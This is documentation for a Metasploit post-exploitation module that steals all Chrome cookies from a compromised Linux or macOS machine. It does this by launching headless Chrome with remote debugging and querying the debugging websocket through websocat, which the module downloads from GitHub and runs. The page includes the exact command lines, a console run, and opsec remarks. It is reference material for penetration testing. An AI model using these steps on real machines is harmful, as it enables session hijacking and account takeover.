## Chrome Gather Cookies

Uses [Headless Chrome](https://developers.google.com/web/updates/2017/04/headless-chrome) and [Chrome's Remote Debugging](https://chromedevtools.github.io/devtools-protocol/) to read all cookies from the Default Chrome profile of the user.

## Opsec

There are several things this module does which are not considered stealthy.

* Downloads and executes https://github.com/vi/websocat
* Writes to disk (deletes files after use)

The reason for this is that the module needs a way to communicate via the websocket protocol on the target machine, since Remote Debugging is exposed only via a websocket URL. If you don't want to take these opsec risks, and have another way of reading and writing websocket data on the target machine, example Python code for a manual exploit can be found at https://github.com/defaultnamehere/cookie_crimes.


## Vulnerable Application

This technique works on Chrome 59 or later on all operating systems. Note that this module does not yet support Windows, only Linux and macOS.

Chrome does not need to be running on the target machine for this module to work.

## Verification Steps

  1. Obtain a session on the target machine
  2. Do: ```use post/chrome/gather/cookies```
  3. Do: ```set SESSION <your session ID>```
  4. Do: ```run```

## Options

  **HEADLESS_URL**

  When Headless Chrome is opened, it needs a URL to browse to. The default is "about://blank" (an empty page in Chrome), but if you change this option, the target Chrome will make a fully authenticated request to the URL. This can be combined with Chrome's `--dump-dom` flag to print the HTML source of an authenticated HTTP request to the console.

  **CHROME_BINARY_PATH**

  The path to the user's Chrome binary. On Linux this defaults to searching for `google-chrome` in `$PATH`. On macOS, this defaults to `/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'`. If the module doesn't find any cookies, it may be that a different Chrome binary to the one the user normally uses is being run. In that case, you can change the Chrome binary executed with this option.

  **WEBSOCAT_STORAGE_PATH**

  Where to store the downloaded `websocat`. This module needs to speak the websocket protocol somehow, and `websocat` is used for this. It's stored in `/tmp/websocat` by default.

  **COOKIE_STORAGE_PATH**

  Path of the temporary file used to store cookies.

  Redirection to a file is used because `websocat` streams the data, and can't send cookies larger than 65535 bytes in one message. Streaming breaks metasploit's `cmd_exec` function, and so the cookies can't be read if they're larger than 65535 bytes. The cookies are temporarily written to disk as a workaround.

  **MAX_RETRIES**

  Chrome can take some time to make the `websocketDebuggerUrl` available at `localhost:9222/json`. This option specifies how many times to retry checking for a response from `localhost:9222/json`.

  **REMOTE_DEBUGGING_PORT**
  Port to tell Chrome to expose Remote Debugging on. Default is the normal remote debugging port, `9222`.

## Scenarios

### Linux (or OS X)

  Suppose you've got a session on the target machine.

  To extract the target machine's Chrome cookies

  ```
  msf > use post/chrome/gather/cookies
  msf post(chrome/gather/cookies) > set SESSION <your session ID>

  msf5 post(test/chrome_cookies) > options

  Module options (post/test/chrome_cookies):

     Name                   Current Setting    Required  Description
     ----                   ---------------    --------  -----------
     CHROME_BINARY_PATH                        no        The path to the user's Chrome binary (leave blank to use the default for the OS)
     COOKIE_STORAGE_PATH    /tmp/websocat.log  no        Where to write the retrieved cookies temporarily
     HEADLESS_URL           about://blank      no        The URL to load with the user's headless chrome
     MAX_RETRIES            3                  no        Max retries for websocket request to Chrome remote debugging URL.
     REMOTE_DEBUGGING_PORT  9222               no        Port on target machine to use for remote debugging protocol
     SESSION                1                  yes       The session to run this module on.
     WEBSOCAT_STORAGE_PATH  /tmp/websocat      no        Where to write the websocat binary temporarily while it is used

  msf post(chrome/gather/cookies) > run

  [*] Activated Chrome's Remote Debugging via google-chrome --headless --user-data-dir="/home/target_username/.config/google-chrome/" --remote-debugging-port=9222 about://blank
  [!] Writing file /tmp/websocat to disk temporarily
  [*] Downloading https://github.com/vi/websocat/releases/download/v1.2.0/websocat_nossl_i386-linux to /tmp/websocat
  [!] Writing file /tmp/websocat.log to disk temporarily
  [-] Error running echo '{"id": 1, "method": "Network.getAllCookies"}' | /tmp/websocat -q ws://localhost:9222/devtools/page/2BB6CD14146BFB67C4523D85A348508 > /tmp/websocat.log
  [-] /bin/sh: 1: /tmp/websocat: Text file busy
  [-] No data read from websocket debugger url ws://localhost:9222/devtools/page/2BB6CD14146BFB67C4523D85A348508. Retrying... (Retries left: 2)
  [!] Writing file /tmp/websocat.log to disk temporarily
  [+] Read 1470 cookies from ws://localhost:9222/devtools/page/2BB6CD14146BFB67C4523D85A348508
  [*] Deleted /tmp/websocat
  [*] Deleted /tmp/websocat.log
  [+] Chrome Cookies stored in /home/your_username/.msf4/loot/20181203153956_default_127.0.0.1_chrome.gather.co_192519.txt
  [*] Post module execution completed
  ```
  In this example, a race condition occurred between writing the websocat binary and executing it. The module caught this and retried so it can continue gracefully.


## Future features

### Windows support
This technique works on Windows as well, this module just doesn't implement the Windows-specific functionality (the use of `websocat` to speak the websocket protocol, for example).

### Profiles
This module only extracts cookies from the default Chrome profile. The target may have multiple, and you may which to extract cookies from all of them. This would require enumerating and extracting the profiles by name. Example code to extract cookies from a non-default Chrome profile can be found at https://github.com/defaultnamehere/cookie_crimes.

## See also
See https://github.com/defaultnamehere/cookie_crimes for more information and manual instructions for Windows.

See https://mango.pdf.zone/stealing-chrome-cookies-without-a-password for the blog post in which this technique was first published.


